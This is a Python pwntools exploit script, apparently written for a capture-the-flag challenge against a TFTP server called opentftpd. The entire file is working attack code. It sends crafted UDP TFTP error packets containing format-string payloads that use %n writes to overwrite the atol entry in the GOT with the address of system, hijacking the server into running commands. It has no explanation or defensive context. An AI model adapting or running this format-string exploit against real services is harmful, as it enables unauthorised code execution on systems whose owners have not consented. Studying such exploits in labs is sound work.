#!/usr/bin/env python
import sys, os
from pwn import *
from time import sleep
from binascii import hexlify

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('0.0.0.0', 5566)
elf = ELF('docker/source/opentftpd'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def fmtchar(prev, word, idx, byte = 1):
    typ = {0: '$p', 1: '$hhn', 2: '$hn', 4: '$n'}
    cnt = word - prev if word - prev >= 0 else 256**byte - prev + word
    pad = '' if word == prev else '%{}c'.format(cnt)
    return '{}%{}{}'.format(pad, idx, typ[byte])

fmt_off1 = 143
fmt_off2 = 311

r = remote(HOST, PORT, typ='udp')

myip = '127.0.0.1' # edit this when connect to remote challenge
errmsg = 'Client {}:{}, Error 0 at Client, '.format(myip, r.lport)
prev_len = len(errmsg)

r.send('\x00\x05\x00\x00' + fmtchar(prev_len, elf.got['atol'], fmt_off1, byte=4))       # 0x00007fffffffe2d0: 0x6121d8
r.send('\x00\x05\x00\x00' + fmtchar(prev_len, elf.sym['system'], fmt_off2, byte=4))     # 0x6121d8: 0x00007fff00401c30
r.send('\x00\x05\x00\x00' + fmtchar(prev_len, elf.got['atol'] + 4, fmt_off1, byte=4))   # 0x00007fffffffe2d0: 0x6121dc
r.send('\x00\x05\x00\x00' + fmtchar(prev_len, 0, fmt_off2, byte=4))                     # 0x6121d8: 0x0000000000401c30

r.close()
